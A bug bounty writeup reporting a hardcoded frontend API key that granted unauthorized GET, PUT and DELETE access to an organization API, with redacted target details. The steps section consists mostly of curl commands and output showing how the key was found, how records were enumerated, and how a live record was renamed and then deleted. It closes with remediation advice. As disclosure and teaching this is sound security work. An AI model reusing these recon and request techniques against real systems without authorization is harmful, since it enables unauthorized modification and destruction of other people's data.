---
title: "Bug Bounty Writeup: Hardcoded API Key Leads to Insecure API Endpoints"
date: 2025-08-21 14:27:36 +0000
layout: post
categories:
  - Bug Bounty
tags:
  - writeups
  - bugbounty
  - api
  - p4
  - bugcrowd
---
****
## Overview

This is a writeup for a P4 vulnerability I discovered and submitted on Bugcrowd. The vulnerability involves a hardcoded API key exposed in the frontend, which granted unauthorized access to sensitive endpoints. Note that all target constraints below have been anonymized to protect the company's identity.

- **Target Location**: `*.[REDACTED].com`
- **Target Category**: Web App
- **VRT**: Cloud Security > Misconfigured Services and APIs > Insecure API Endpoints
- **Priority**: P4
- **Bug URL**: `https://api.[REDACTED].com/units/api/v1/organizations/{org_id}?apikey={hardcoded_key}`

## Description

Hello everyone! In this writeup, I want to share a recent finding from a private bug bounty program on Bugcrowd that was triaged as a P4.

While exploring the target's web application, I discovered a hardcoded API key in the frontend JavaScript files. This key surprisingly granted access to protected backend endpoints that allowed `DELETE`, `PUT`, and `GET` operations. Using this API key, I was able to successfully modify and delete organization records, demonstrating critical unauthorized modification and destructive capabilities.

### Business Impact

- **Integrity**: Unauthorized modification and deletion of official records.
- **Availability/Cost**: Potential mass deletion / service disruption and quota abuse.
- **Reputation/Compliance**: Loss of public trust; regulatory exposure.

This vulnerability can result in financial losses and regulatory fines, as well as reputational damage and a loss of customer trust.

---

## Steps to Reproduce

### 1. Locate the exposed API key and enumerate organizations

While mapping the attack surface, I always make sure to inspect static assets like JavaScript bundles. Developers sometimes accidentally leave sensitive configurations or API keys inside these files. 

During my recon, I accessed the main JavaScript bundle at `https://app.[REDACTED].com/main.js` and searched for keywords like `api`, `key`, `token`, and `secret`. Sure enough, I found a hardcoded API key: `[REDACTED_API_KEY]`.

Next, I looked for API endpoints to test this key against. I discovered an endpoint for fetching organizations and tested the key:
`https://api.[REDACTED].com/units/api/v1/organizations?apikey=[REDACTED_API_KEY]`

This request successfully returned a list of organizations, including their internal UUIDs!

### 2. Craft a request to the sensitive endpoint, attempting to access or modify data

With a valid `UUID` in hand, the next step in REST API testing is to check for standard HTTP verbs (CRUD operations) like `GET`, `PUT`, `POST`, and `DELETE`. 

**Try GET method with API-KEY:**
```bash
curl -i "https://api.[REDACTED].com/units/api/v1/organizations/[REDACTED_UUID]?apikey=[REDACTED_API_KEY]"
```

**Try PUT method with API-KEY:**
```bash
curl -i -X PUT -H "Content-Type: application/json" \
-d '{
"id":"[REDACTED_UUID]",
"name":"THIS IS PENTEST API KEY",
"typeId":"[REDACTED_TYPE_UUID]"
}' "https://api.[REDACTED].com/units/api/v1/organizations/[REDACTED_UUID]?apikey=[REDACTED_API_KEY]"
```

**Try DELETE method with API-KEY:**
```bash
curl -i -X DELETE -H "Content-Type: application/json" \
-d '{
"id":"[REDACTED_UUID]",
"name":"[REDACTED_ORGANIZATION_NAME]",
"typeId":"[REDACTED_TYPE_UUID]"
}' "https://api.[REDACTED].com/units/api/v1/organizations/[REDACTED_UUID]?apikey=[REDACTED_API_KEY]"
```

### 3. Observe the API's response

*(Proof of Concept outputs, sanitized)*

**Checking without API Key:**
```http
┌──(h4ckmonkey㉿lenovo)-[~]
└─$ curl -i "https://api.[REDACTED].com/units/api/v1/organizations/[REDACTED_UUID]"
HTTP/2 403
content-length: 0
date: Thu, 21 Aug 2025 13:51:03 GMT
server: Kestrel
```

**Checking with INVALID API Key:**
```http
┌──(h4ckmonkey㉿lenovo)-[~]
└─$ curl -i "https://api.[REDACTED].com/units/api/v1/organizations/[REDACTED_UUID]?apikey=INVALID"
HTTP/2 403
content-length: 0
date: Thu, 21 Aug 2025 13:51:12 GMT
server: Kestrel
```

**Executing valid GET request with exposed API Key:**
```http
┌──(h4ckmonkey㉿lenovo)-[~]
└─$ curl -i "https://api.[REDACTED].com/units/api/v1/organizations/[REDACTED_UUID]?apikey=[REDACTED_API_KEY]"
HTTP/2 200
content-type: application/json; charset=utf-8
content-length: 131
date: Thu, 21 Aug 2025 13:51:29 GMT
server: Kestrel

{"typeId":"[REDACTED_TYPE_UUID]","name":"[REDACTED_ORGANIZATION_NAME]","id":"[REDACTED_UUID]"}
```

**Executing PUT request to modify the organization name:**
```http
┌──(h4ckmonkey㉿lenovo)-[~]
└─$ curl -i -X PUT -H "Content-Type: application/json" \
-d '{
  "id":"[REDACTED_UUID]",
  "name":"THIS IS PENTEST API KEY",
  "typeId":"[REDACTED_TYPE_UUID]"
}' "https://api.[REDACTED].com/units/api/v1/organizations/[REDACTED_UUID]?apikey=[REDACTED_API_KEY]"
HTTP/2 200
content-type: application/json; charset=utf-8
content-length: 126
date: Thu, 21 Aug 2025 13:51:47 GMT
server: Kestrel

{"typeId":"[REDACTED_TYPE_UUID]","name":"THIS IS PENTEST API KEY","id":"[REDACTED_UUID]"}
```

**Confirming the modification via GET:**
```http
┌──(h4ckmonkey㉿lenovo)-[~]
└─$ curl -i "https://api.[REDACTED].com/units/api/v1/organizations/[REDACTED_UUID]?apikey=[REDACTED_API_KEY]"
HTTP/2 200
content-type: application/json; charset=utf-8
content-length: 126
date: Thu, 21 Aug 2025 13:51:57 GMT
server: Kestrel

{"typeId":"[REDACTED_TYPE_UUID]","name":"THIS IS PENTEST API KEY","id":"[REDACTED_UUID]"}
```

**Executing DELETE request with the exposed API Key:**
```http
┌──(h4ckmonkey㉿lenovo)-[~]
└─$ curl -i -X DELETE -H "Content-Type: application/json" \
-d '{
  "id":"[REDACTED_UUID]",
  "name":"[REDACTED_ORGANIZATION_NAME]",
  "typeId":"[REDACTED_TYPE_UUID]"
}' "https://api.[REDACTED].com/units/api/v1/organizations/[REDACTED_UUID]?apikey=[REDACTED_API_KEY]"
HTTP/2 200
content-length: 0
date: Thu, 21 Aug 2025 13:52:16 GMT
server: Kestrel
```

**Confirming the target organization index is not found (404) via GET / PUT request after deletion:**
```http
┌──(h4ckmonkey㉿lenovo)-[~]
└─$ curl -i "https://api.[REDACTED].com/units/api/v1/organizations/[REDACTED_UUID]?apikey=[REDACTED_API_KEY]"
HTTP/2 404
content-type: application/problem+json; charset=utf-8
date: Thu, 21 Aug 2025 13:52:29 GMT
server: Kestrel

{"type":"https://tools.ietf.org/html/rfc9110#section-15.5.5","title":"Not Found","status":404,"traceId":"[REDACTED_TRACE_ID]"}

┌──(h4ckmonkey㉿lenovo)-[~]
└─$ curl -i -X PUT -H "Content-Type: application/json" \
-d '{
  "id":"[REDACTED_UUID]",
  "name":"THIS IS PENTEST API KEY",
  "typeId":"[REDACTED_TYPE_UUID]"
}' "https://api.[REDACTED].com/units/api/v1/organizations/[REDACTED_UUID]?apikey=[REDACTED_API_KEY]"
HTTP/2 404
content-type: application/problem+json; charset=utf-8
date: Thu, 21 Aug 2025 13:52:52 GMT
server: Kestrel

{"type":"https://tools.ietf.org/html/rfc9110#section-15.5.5","title":"Not Found","status":404,"traceId":"[REDACTED_TRACE_ID]"}
```

---

## Conclusion

The exposed API key allowed unauthorized read, write, and delete operations on sensitive records. Because the client-side JavaScript was directly interacting with a privileged backend API using a hardcoded static key, anyone who inspected the source code could take full control over the exposed objects.

### Remediation Advice

To fix this type of vulnerability, organizations should:
1. **Revoke the leaked key immediately** to prevent further abuse.
2. **Remove static API keys from frontend code.** Frontend applications should not hold privileged keys.
3. **Implement proper authentication & authorization.** Use identity-based access controls (like OAuth2, JWTs with granular scopes, or session cookies) so users can only perform actions on resources they actually own.

### Final Thoughts

A big thank you to the target company's security team and the Bugcrowd triage team for their fast response time, professionalism, and for resolving this issue promptly. Finding hardcoded secrets in JavaScript files is still incredibly common, so always remember to double-check those `.js` bundles when you're hunting!

Thanks for reading, and happy hunting!
